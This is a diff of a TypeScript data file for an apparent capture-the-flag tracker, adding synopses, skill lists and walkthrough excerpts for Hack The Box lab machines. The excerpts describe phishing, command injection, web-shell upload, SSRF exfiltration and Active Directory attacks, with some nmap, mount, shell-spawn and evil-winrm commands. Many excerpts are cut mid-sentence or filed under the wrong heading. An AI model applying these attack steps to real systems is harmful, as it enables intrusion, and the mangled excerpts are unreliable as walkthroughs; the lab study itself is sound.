+    "officialWalkthrough": "### 📋 Official Synopsis\nSneakyMailer is a medium difficulty Linux machine that features a phishing scenario, from which a set of credentials are gained. These credentials provide access to a mailbox, which reveals another set of credentials to access the FTP service. FTP file upload allows a foothold to be gained. PyPI server package installation can be exploited to move laterally. Root access can be obtained by leveraging sudo privileges.\n\n### 🎯 Core Skills\n- **Phishing**\n- **PyPI Package**\n\n### ⚔️ Foothold Vector\nto be gained. PyPI server package installation can be exploited to move laterally.\n\n### 👑 Privilege Escalation\naccess can be obtained by leveraging sudo privileges. Skills Required Python/Bash Scripting Skills Learned Phishing PyPI Package Exploitation pip3 Exploitation Enumeration Nmap Nmap output reveals that the target server has ports 21 (FTP), 22 (OpenSSH), 25 (Postfix), 80 & 8080 (Nginx), 143 (Imapd) and 993 (Imapd SSL) available. Nmap didn't state that FTP anonymous authentication was permitted. ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.197 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -sC -sV -p$ports 10.10.10.197 Nginx Browsing to port 80 redirects us to sneakycorp.htb . This can also be viewed with curl utility. Let's add sneakycorp.htb to /etc/hosts . 10.10.10."
   },
   {
     "id": "htb-skyfall",
@@ -5238,10 +5351,18 @@ export const INITIAL_MACHINES: Machine[] = [
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/squashed",
     "writeupUrl": "https://0xdf.gitlab.io/tags#squashed",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "Squashed is an Easy Difficulty Linux machine that features a combination of both identifying and leveraging misconfigurations in NFS shares through impersonating users. Additionally, the box incorporates the",
     "timeSpentSeconds": 0,
     "createdAt": "2022-11-10T07:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Squashed is an Easy Difficulty Linux machine that features a combination of both identifying and leveraging misconfigurations in NFS shares through impersonating users. Additionally, the box incorporates the",
+    "skillsLearned": [
+      "Spotting and leveraging NFS misconfigurations",
+      "Managing users via the Linux command line",
+      "Enumerating and understanding a system running X11"
+    ],
+    "officialPdf": "514-Squashed_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nSquashed is an Easy Difficulty Linux machine that features a combination of both identifying and leveraging misconfigurations in NFS shares through impersonating users. Additionally, the box incorporates the\n\n### 🎯 Core Skills\n- **Spotting and leveraging NFS misconfigurations**\n- **Managing users via the Linux command line**\n- **Enumerating and understanding a system running X11**\n\n### ⚔️ Foothold Vector\n. We begin our enumeration by listing any potentially available shares hosted on the target machine. We can see two globally accessible file-shares, as indicated by the star. We can have a look at their contents by mounting the directories. showmount -e squashed.htb sudo mount -t nfs squashed.htb:/var/www/html /mnt/1 When listing the contents of /var/www/html , which is now mounted at /mnt/1 , it becomes evident that while we can see filenames, we cannot see the files' owners or permissions. That also means we cannot read the files' contents or modify them whatsoever. We can, however, check the actual directory's permissions by running ls on the folder itself.\n\n### 👑 Privilege Escalation\nby having the attacker take a screenshot of the current Desktop. Skills Required Basic enumeration Basic understanding of the Linux command line Skills Learned Spotting and leveraging NFS misconfigurations Managing users via the Linux command line Enumerating and understanding a system running X11 Enumeration Nmap ports=$(nmap -p- --min-rate=1000 -T4 squashed.htb | grep '^[0-9]' | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sC -sV squashed.htb The nmap scan shows a standard SSH service running on port 22 , an Apache webserver running on port 80 , as well as NFS and rpcbind running on their default ports."
   },
   {
     "id": "htb-derailed",
@@ -5328,15 +5449,27 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Docker/Host-shared-PIDs",
+      "HTB",
+      "Python",
+      "Tunneling"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/rainyday",
     "writeupUrl": "https://0xdf.gitlab.io/tags#rainyday",
-    "hint": "Hack The Box Linux machine. Rated Hard difficulty.",
+    "hint": "RainyDay is a hard Linux machine that starts with a web application that allows registered users to create and run containers on the remote machine. Enumerating the application it is discovered that registrations are closed.",
     "timeSpentSeconds": 0,
     "createdAt": "2022-10-15T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "RainyDay is a hard Linux machine that starts with a web application that allows registered users to create and run containers on the remote machine. Enumerating the application it is discovered that registrations are closed. Further",
+    "skillsLearned": [
+      "Tunneling",
+      "Flask session cookie crafting",
+      "Docker/Host shared PIDs",
+      "Python"
+    ],
+    "officialPdf": "502-RainyDay_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nRainyDay is a hard Linux machine that starts with a web application that allows registered users to create and run containers on the remote machine. Enumerating the application it is discovered that registrations are closed. Further\n\n### 🎯 Core Skills\n- **Tunneling**\n- **Flask session cookie crafting**\n- **Docker/Host shared PIDs**\n- **Python**\n\n### ⚔️ Foothold Vector\nfor arbitrary code execution Bruteforcing bcrypt hashes Enumeration Nmap The Nmap output reveals two ports open. On port 22 an SSH server is running and on port 80 an Nginx web server. Since we don't, currently, have any valid SSH credentials we should begin our enumeration by visiting port 80 . Before we begin our enumeration process we notice that the Nmap output reveals the hostname RainyDay.htb , so we modify our /etc/hosts file accordingly. Nginx - Port 80 ports=$(nmap -p- --min-rate=1000 -T4 10.129.228.65 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sC -sV 10.129.228.65 echo \"10.129.228.65 rainycloud.\n\n### 👑 Privilege Escalation\n. The script uses the algorithm bcrypt which has a maximum length restriction. Due to bad design, an attacker is able to bruteforce the secret salt and crack the root password that was acquired from the web application. Finally, a password re-use scenario comes in to play and the cracked password works for the root user on the remote machine. Skills Required Enumeration Docker Knowledge Flask session cookie signing Hashing algorithms Skills Learned Tunneling Flask session cookie crafting Docker/Host shared PIDs Python exploitation for arbitrary code execution Bruteforcing bcrypt hashes Enumeration Nmap The Nmap output reveals two ports open."
   },
   {
     "id": "htb-photobomb",
@@ -5347,15 +5480,23 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
+      "Command-Injection",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/photobomb",
     "writeupUrl": "https://0xdf.gitlab.io/tags#photobomb",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "Photobomb is an easy Linux machine where plaintext credentials are used to access an internal web application with a Download functionality that is vulnerable to a blind command injection. Once a foothold as the machine's main user is established, a poorly configured shell script",
     "timeSpentSeconds": 0,
     "createdAt": "2022-10-08T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Photobomb is an easy Linux machine where plaintext credentials are used to access an internal web application with a Download functionality that is vulnerable to a blind command injection. Once a foothold as the machine's main user is established, a poorly configured shell script that references binaries without their full paths is leveraged to obtain escalated privileges, as it can be ran with sudo .",
+    "skillsLearned": [
+      "Command Injection",
+      "Exploiting UNIX PATH variables"
+    ],
+    "officialPdf": "500-Photobomb_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nPhotobomb is an easy Linux machine where plaintext credentials are used to access an internal web application with a Download functionality that is vulnerable to a blind command injection. Once a foothold as the machine's main user is established, a poorly configured shell script that references binaries without their full paths is leveraged to obtain escalated privileges, as it can be ran with sudo .\n\n### 🎯 Core Skills\n- **Command Injection**\n- **Exploiting UNIX PATH variables**\n\n### ⚔️ Foothold Vector\nas the machine's main user is established, a poorly configured shell script that references binaries without their full paths is leveraged to obtain escalated privileges, as it can be ran with sudo . Skills Required Enumeration Source Code Analysis Linux CLI Usage Skills Learned Command Injection Exploiting UNIX PATH variables Enumeration Nmap An initial Nmap scan reveals port 22 (SSH) and port 80 ( Nginx ) open. HTTP We browse to port 80 and are redirected to the photobomb.htb domain, which we add to our /etc/hosts file, before refreshing the page. ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.182| grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p $ports -sV 10.10.11.\n\n### 👑 Privilege Escalation\nEnumeration Enumeration of the target system shows a cronjob running a Bash script located under /opt/ every 5 minutes. As the cronjob is being ran with sudo , we check what other commands the wizard user might be allowed to run with elevated privileges. The output shows that the user wizard may run the /opt/cleanup.sh script with super user ( root ) permissions, without the need for a password. Moreover, for this one command we may also set environment variables, as indicated by the SETENV flag. We cannot edit the script, but can read the contents of the file. python3 -c 'import pty;pty.spawn(\"/bin/bash\")' sudo -l Upon examining the script, we see that the ."
   },
   {
     "id": "htb-ambassador",
@@ -5366,15 +5507,24 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
+      "CVE-2021-43798",
+      "Configuration-analysis",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/ambassador",
     "writeupUrl": "https://0xdf.gitlab.io/tags#ambassador",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Ambassador is a medium difficulty Linux machine addressing the issue of hard-coded plaintext credentials being left in old versions of code. Firstly, a Grafana CVE ( CVE-2021-43798 ) is used to read arbitrary files on the target.",
     "timeSpentSeconds": 0,
     "createdAt": "2022-10-01T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Ambassador is a medium difficulty Linux machine addressing the issue of hard-coded plaintext credentials being left in old versions of code. Firstly, a Grafana CVE ( CVE-2021-43798 ) is used to read arbitrary files on the target. After researching how the service is commonly configured, credentials for the web portal are discovered in one of the default locations. Once logged in, further",
+    "skillsLearned": [
+      "Leveraging misconfigurations in common services",
+      "Configuration analysis"
+    ],
+    "officialPdf": "499-Ambassador_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nAmbassador is a medium difficulty Linux machine addressing the issue of hard-coded plaintext credentials being left in old versions of code. Firstly, a Grafana CVE ( CVE-2021-43798 ) is used to read arbitrary files on the target. After researching how the service is commonly configured, credentials for the web portal are discovered in one of the default locations. Once logged in, further\n\n### 🎯 Core Skills\n- **Leveraging misconfigurations in common services**\n- **Configuration analysis**\n\n### 🛡️ Associated CVEs\n`CVE-2021-43798`\n\n### ⚔️ Foothold Vector\non the machine. Lastly, a misconfigured Consul service is used to obtain escalated privileges, by retrieving an authentication token from a prior commit of a Git repository. Skills Required Linux enumeration Skills Learned Leveraging misconfigurations in common services Configuration analysis Enumeration Nmap ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.183 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sC -sV 10.10.11.183 An initial Nmap scan reveals that TCP ports 22 , 80 , 3000 , and 3306 are open.\n\n### 👑 Privilege Escalation\nDifficulty: Medium Synopsis Ambassador is a medium difficulty Linux machine addressing the issue of hard-coded plaintext credentials being left in old versions of code. Firstly, a Grafana CVE ( CVE-2021-43798 ) is used to read arbitrary files on the target. After researching how the service is commonly configured, credentials for the web portal are discovered in one of the default locations. Once logged in, further enumeration reveals another configuration file containing MySQL credentials, which are used to retrieve a password to a user account and gain a foothold on the machine."
   },
   {
     "id": "htb-absolute",
@@ -5404,15 +5554,25 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "NoSQL-Injection",
+      "Reverse-Engineering"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/shoppy",
     "writeupUrl": "https://0xdf.gitlab.io/tags#shoppy",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "Shoppy is an easy Linux machine that features a website with a login panel and a user search functionality, which is vulnerable to NoSQL injection. It can be exploited to obtain the password hashes of all the users.",
     "timeSpentSeconds": 0,
     "createdAt": "2022-09-17T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Shoppy is an easy Linux machine that features a website with a login panel and a user search functionality, which is vulnerable to NoSQL injection. It can be exploited to obtain the password hashes of all the users. Upon cracking the password hash for one of the users we can authenticate into the Mattermost chat running on the server where we obtain the SSH credentials for user jaeger . The lateral movement to user deploy is performed by reverse engineering a password manager binary, which reveals the password for the user. We discover that the user deploy is a member of the group docker .",
+    "skillsLearned": [
+      "NoSQL Injection",
+      "Reverse Engineering",
+      "Exploiting docker usergroup privileges"
+    ],
+    "officialPdf": "496-Shoppy_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nShoppy is an easy Linux machine that features a website with a login panel and a user search functionality, which is vulnerable to NoSQL injection. It can be exploited to obtain the password hashes of all the users. Upon cracking the password hash for one of the users we can authenticate into the Mattermost chat running on the server where we obtain the SSH credentials for user jaeger . The lateral movement to user deploy is performed by reverse engineering a password manager binary, which reveals the password for the user. We discover that the user deploy is a member of the group docker .\n\n### 🎯 Core Skills\n- **NoSQL Injection**\n- **Reverse Engineering**\n- **Exploiting docker usergroup privileges**\n\n### 👑 Privilege Escalation\nflag. Skills required Web Enumeration Linux Fundamentals Skills learned NoSQL Injection Reverse Engineering Exploiting docker usergroup privileges Enumeration Nmap Let's run a Nmap scan to discover any open ports on the remote host. The Nmap scan shows that SSH is listening on its default port, i.e. port 22 and a nginx HTTP web server is running on port 80 . There's another open port 9093 whose service is not recognized by Nmap. HTTP Upon browsing to port 80 , we are redirected to the domain shoppy.htb . ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.170 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sV 10.10.11.180 Let's add an entry for shoppy."
   },
   {
     "id": "htb-sekhmet",
@@ -5442,15 +5602,25 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Exploiting-SUID-binaries",
+      "HTB",
+      "HTTP-Header-modification"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/updown",
     "writeupUrl": "https://0xdf.gitlab.io/tags#updown",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "UpDown is a medium difficulty Linux machine with SSH and Apache servers exposed. On the Apache server a web application is featured that allows users to check if a webpage is up.",
     "timeSpentSeconds": 0,
     "createdAt": "2022-09-03T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "UpDown is a medium difficulty Linux machine with SSH and Apache servers exposed. On the Apache server a web application is featured that allows users to check if a webpage is up. A directory named .git is identified on the server and can be downloaded to reveal the source code of the dev subdomain running on the target, which can only be accessed with a special HTTP header. Furthermore, the subdomain allows files to be uploaded, leading to remote code execution using the phar:// PHP wrapper.",
+    "skillsLearned": [
+      "HTTP Header modification",
+      "PHP Local File Inclusion Firewall bypass",
+      "Exploiting SUID binaries"
+    ],
+    "officialPdf": "493-UpDown_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nUpDown is a medium difficulty Linux machine with SSH and Apache servers exposed. On the Apache server a web application is featured that allows users to check if a webpage is up. A directory named .git is identified on the server and can be downloaded to reveal the source code of the dev subdomain running on the target, which can only be accessed with a special HTTP header. Furthermore, the subdomain allows files to be uploaded, leading to remote code execution using the phar:// PHP wrapper.\n\n### 🎯 Core Skills\n- **HTTP Header modification**\n- **PHP Local File Inclusion Firewall bypass**\n- **Exploiting SUID binaries**\n\n### ⚔️ Foothold Vector\nAs stated, we need to add the special HTTP header to gain access to the subdomain. We could do this manually for every request, but BurpSuite allows us to automate this task by adding an entry in the Proxy -> Options section, under Match and Replace. We add a new entry, and by leaving the Match field empty, it will simply add a new header (which we define in the Replace field) to each request. Doing so allows us access to the developer subdomain, which is a site similar in function and form to the first website we came across. As opposed to the initial site, this beta requires a file with a list of websites to check.\n\n### 👑 Privilege Escalation\n. Skills Required Web Enumeration Local Git repository hacking PHP File Inclusion Skills Learned HTTP Header modification PHP Local File Inclusion Firewall bypass Exploiting SUID binaries Enumeration Nmap Let's begin by scanning for open ports using Nmap . The Nmap scan reveals that ports 22 (SSH) and 80 (Apache) are open. Let's navigate to port 80 with a browser to take a look at the website. HTTP ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.177 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sC -sV 10.10.11.177 The web application appears to check whether a given website is up or not."
   },
   {
     "id": "htb-vessel",
@@ -5480,15 +5650,25 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
+      "Exploit-modification",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/health",
     "writeupUrl": "https://0xdf.gitlab.io/tags#health",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Health is a medium Linux machine that features an SSRF vulnerability on the main webpage that can be exploited to access services that are available only on localhost. More specifically, a Gogs instance is accessible only through localhost and this specific version is vulnerable ",
     "timeSpentSeconds": 0,
     "createdAt": "2022-08-20T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Health is a medium Linux machine that features an SSRF vulnerability on the main webpage that can be exploited to access services that are available only on localhost. More specifically, a Gogs instance is accessible only through localhost and this specific version is vulnerable to an SQL injection attack. Due to the way that an attacker can interact with the Gogs instance the best approach in this scenario is to replicate the remote environment by installing the same Gogs version on a local machine and then using automated tools to produce a valid payload.",
+    "skillsLearned": [
+      "SSRF localhost filter bypass",
+      "Data exfiltration using SSRF",
+      "Replicating remote environment",
+      "Exploit modification"
+    ],
+    "officialPdf": "491-Health_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nHealth is a medium Linux machine that features an SSRF vulnerability on the main webpage that can be exploited to access services that are available only on localhost. More specifically, a Gogs instance is accessible only through localhost and this specific version is vulnerable to an SQL injection attack. Due to the way that an attacker can interact with the Gogs instance the best approach in this scenario is to replicate the remote environment by installing the same Gogs version on a local machine and then using automated tools to produce a valid payload.\n\n### 🎯 Core Skills\n- **SSRF localhost filter bypass**\n- **Data exfiltration using SSRF**\n- **Replicating remote environment**\n- **Exploit modification**\n\n### ⚔️ Foothold Vector\nReading through the exploitation steps we can see that the SQL injection payload is extremely complicated. Moreover, the way that we can access the Gogs instance in this case is preventing the use of automated tools like SQLmap. Our best option in such cases is to install a local instance of the service, scan it using automated tools, find the correct payload and then use that payload on the remote instance. We can visit the official Github page and download the 0.5.5 release which is vulnerable to the aforementioned SQL injection and also matches the version on the remote instance. Afterwards, we extract the archive, change our directory to the extracted gogs folder and execute ./gogs web .\n\n### 👑 Privilege Escalation\nrelies on cron jobs that are running under the user root . These cron jobs are related to the functionality of the main web application and process unfiltered data from a database. Thus, an attacker is able to inject a malicious task inside the database and exfiltrate the SSH key file of the user root , thus, allowing him to gain a root session on the remote machine. Skills Required Enumeration Source code review Use of automated tools Database interaction Skills Learned SSRF localhost filter bypass Data exfiltration using SSRF Replicating remote environment Exploit modification Enumeration Nmap The initial Nmap output reveals just three ports open."
   },
   {
     "id": "htb-outdated",
@@ -5499,15 +5679,25 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
+      "CVE-2022-30190",
+      "Golden-Ticket-Attack",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/outdated",
     "writeupUrl": "https://0xdf.gitlab.io/tags#outdated",
-    "hint": "Hack The Box Windows machine. Rated Medium difficulty.",
+    "hint": "Outdated is a Medium Difficulty Linux machine that features a foothold based on the Follina CVE of 2022. The box further encompasses an Active Directory scenario, where we must pivot from domain user to domain controller, using an array of tools to leverage the AD 's configuratio",
     "timeSpentSeconds": 0,
     "createdAt": "2022-08-13T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Outdated is a Medium Difficulty Linux machine that features a foothold based on the Follina CVE of 2022. The box further encompasses an Active Directory scenario, where we must pivot from domain user to domain controller, using an array of tools to leverage the AD 's configuration and adjacent edges to our advantage. The final step includes taking advantage of Windows Server Update Services- WSUS and using its poor configuration to compromise the domain controller.",
+    "skillsLearned": [
+      "Shadow Credentials method",
+      "Golden Ticket Attack",
+      "Navigating Active Directory"
+    ],
+    "officialPdf": "490-Outdated_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nOutdated is a Medium Difficulty Linux machine that features a foothold based on the Follina CVE of 2022. The box further encompasses an Active Directory scenario, where we must pivot from domain user to domain controller, using an array of tools to leverage the AD 's configuration and adjacent edges to our advantage. The final step includes taking advantage of Windows Server Update Services- WSUS and using its poor configuration to compromise the domain controller.\n\n### 🎯 Core Skills\n- **Shadow Credentials method**\n- **Golden Ticket Attack**\n- **Navigating Active Directory**\n\n### 🛡️ Associated CVEs\n`CVE-2022-30190`\n\n### ⚔️ Foothold Vector\nbased on the Follina CVE of 2022. The box further encompasses an Active Directory scenario, where we must pivot from domain user to domain controller, using an array of tools to leverage the AD 's configuration and adjacent edges to our advantage. The final step includes taking advantage of Windows Server Update Services- WSUS and using its poor configuration to compromise the domain controller. Skills Required Fundamentals of Active Directory Rudimentary BloodHound setup Skills Learned Shadow Credentials method Golden Ticket Attack Navigating Active Directory Enumeration Nmap ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.\n\n### 👑 Privilege Escalation\nAs we found out during our initial enumeration, WSUS is running on the target machine, and as a quick whoami command reveals, the user sflowers is part of the WSUS group. According to this blogpost on WSUS exploitation, we can locate the server by querying the following registry key: whoami /groups We can see the server running on non-SSL HTTP, under the domain wsus.outdated.htb . We then query the subsequent registry key returned by our initial query, to check whether UseWUServer is set to 1 and verify that the service is in fact active."
   },
   {
     "id": "htb-moderators",
@@ -5523,10 +5713,18 @@ export const INITIAL_MACHINES: Machine[] = [
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/moderators",
     "writeupUrl": "https://0xdf.gitlab.io/tags#moderators",
-    "hint": "Hack The Box Linux machine. Rated Hard difficulty.",
+    "hint": "Moderators is a hard Linux machine that features a blog, which holds security reports. Through Insecure Direct Object Reference (IDOR) undisclosed reports can be found, which lead to a log page where it is possible to upload PDF files.",
     "timeSpentSeconds": 0,
     "createdAt": "2022-08-06T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Moderators is a hard Linux machine that features a blog, which holds security reports. Through Insecure Direct Object Reference (IDOR) undisclosed reports can be found, which lead to a log page where it is possible to upload PDF files. Using basic filter bypasses it's possible to upload a PHP shell and gain access as www-data . A WordPress site can then be found running internally on port 8080. The site contains two plugins, brandfolder and password-manager , the former of which has a Local File Inclusion vulnerability, exploitation of which leads to a shell as the lexi user.",
+    "skillsLearned": [
+      "Bypassing file upload filters",
+      "Insecure Direct Object Reference",
+      "Leveraging WordPress plugin vulnerabilities"
+    ],
+    "officialPdf": "485-Moderators_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nModerators is a hard Linux machine that features a blog, which holds security reports. Through Insecure Direct Object Reference (IDOR) undisclosed reports can be found, which lead to a log page where it is possible to upload PDF files. Using basic filter bypasses it's possible to upload a PHP shell and gain access as www-data . A WordPress site can then be found running internally on port 8080. The site contains two plugins, brandfolder and password-manager , the former of which has a Local File Inclusion vulnerability, exploitation of which leads to a shell as the lexi user.\n\n### 🎯 Core Skills\n- **Bypassing file upload filters**\n- **Insecure Direct Object Reference**\n- **Leveraging WordPress plugin vulnerabilities**\n\n### ⚔️ Foothold Vector\nof which leads to a shell as the lexi user. An SSH key can be found in the WordPress database, which needs to be cracked from the password-manager plugin. Modifying said plugin allows for the SSH key to be decrypted, yielding access to a second user called john . In the second user's home folder there is a Virtual Disk Image (.vdi) file, which is encrypted. Using a .vbox password cracker the password can be recovered. On the disk there is a LUKS encrypted file system which can also be brute forced by using a bash script. Once decrypted, the file system contains scripts, one of which holds the password to the second user. The password can be used to run any command with sudo.\n\n### 👑 Privilege Escalation\nIn the home directory of john we find two directories, scripts and stuff . At first glance, the scripts folder seems to be holding random files, so we'll take a look at stuff . In the stuff directory we find two more directories named VBOX and exp . The exp folder seems to hold exported chat messages. Let's use grep with the -r flag to recursively search for any mention of password in the chat logs. Reading more of the file 2021-09-19.exp gives us more context. (echo '-----BEGIN OPENSSH PRIVATE KEY-----'; php decrypt.php | sed 's/ /\\n/g' | grep -v OPEN | tail -n+4 | head -n-3; echo '-----END OPENSSH PRIVATE KEY-----') > john.ssh chmod 600 john.ssh ssh -i john.ssh john@10.10.11."
   },
   {
     "id": "htb-support",
@@ -5542,10 +5740,18 @@ export const INITIAL_MACHINES: Machine[] = [
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/support",
     "writeupUrl": "https://0xdf.gitlab.io/tags#support",
-    "hint": "Hack The Box Windows machine. Rated Easy difficulty.",
+    "hint": "Support is an Easy difficulty Windows machine that features an SMB share that allows anonymous authentication. After connecting to the share, an executable file is discovered that is used to query the machine's LDAP server for available users.",
     "timeSpentSeconds": 0,
     "createdAt": "2022-07-30T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Support is an Easy difficulty Windows machine that features an SMB share that allows anonymous authentication. After connecting to the share, an executable file is discovered that is used to query the machine's LDAP server for available users. Through reverse engineering, network analysis or emulation, the password that the binary uses to bind the LDAP server is identified and can be used to make further LDAP queries. A user called support is identified in the users list, and the info field is found to contain his password, thus allowing for a WinRM connection to the machine.",
+    "skillsLearned": [
+      "Connecting to an SMB share",
+      "Quering an LDAP server for information",
+      "Performing a Resource Based Constrained Delegation attack"
+    ],
+    "officialPdf": "484-Support_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nSupport is an Easy difficulty Windows machine that features an SMB share that allows anonymous authentication. After connecting to the share, an executable file is discovered that is used to query the machine's LDAP server for available users. Through reverse engineering, network analysis or emulation, the password that the binary uses to bind the LDAP server is identified and can be used to make further LDAP queries. A user called support is identified in the users list, and the info field is found to contain his password, thus allowing for a WinRM connection to the machine.\n\n### 🎯 Core Skills\n- **Connecting to an SMB share**\n- **Quering an LDAP server for information**\n- **Performing a Resource Based Constrained Delegation attack**\n\n### ⚔️ Foothold Vector\nHaving obtained the above credentials, let's connect to the LDAP server and see if we can find any interesting information. To connect we can use the ldapsearch utility. Let's install it. After the utility has been installed let's attempt to bind to the LDAP server using ldap@support.htb as the BindDN with the -D flag, and specifying support and htb as the Domain Components with the -b flag. sudo apt install ldap-utils When connecting to an LDAP server, the BindDN can be considered as a sort of username or account that we connect to and provides permissions to view and edit objects in the LDAP server. The Domain Components on the other hand can be thought of as a directory structure in LDAP.\n\n### 👑 Privilege Escalation\nThe Nmap output already revealed to us that the machine belongs to a Domain. We can get more information about the domain through the Active Directory powershell module that is usually pre-installed on Domain Controllers. evil-winrm -u support -p 'Ironside47pleasure40Watchful' -i support.htb Get-ADDomain Indeed the machine is the Domain Controller ( dc.support.htb ) for the support.htb domain. Let's add this hostname to our hosts file. We can also check if the current user is a member of any interesting groups. echo '10.129.178.26 dc.support."
   },
   {
     "id": "htb-shared",
@@ -5556,15 +5762,26 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "CVE-2022-0543",
+      "CVE-2022-21699",
+      "HTB",
+      "Port-forwarding"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/shared",
     "writeupUrl": "https://0xdf.gitlab.io/tags#shared",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Shared is a Medium Difficulty Linux machine that features a Cookie SQL Injection leading to a foothold, which is then used to escalate privileges by reverse engineering a Golang binary and leveraging two CVEs to gain a root shell.",
     "timeSpentSeconds": 0,
     "createdAt": "2022-07-23T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Shared is a Medium Difficulty Linux machine that features a Cookie SQL Injection leading to a foothold, which is then used to escalate privileges by reverse engineering a Golang binary and leveraging two CVEs to gain a root shell.",
+    "skillsLearned": [
+      "Crafting specific payloads for SQL injections",
+      "Using ghidra to inspect reverse engineered binaries",
+      "Port forwarding"
+    ],
+    "officialPdf": "483-Shared_HTB_Official_writeup_Tamarisk.pdf",
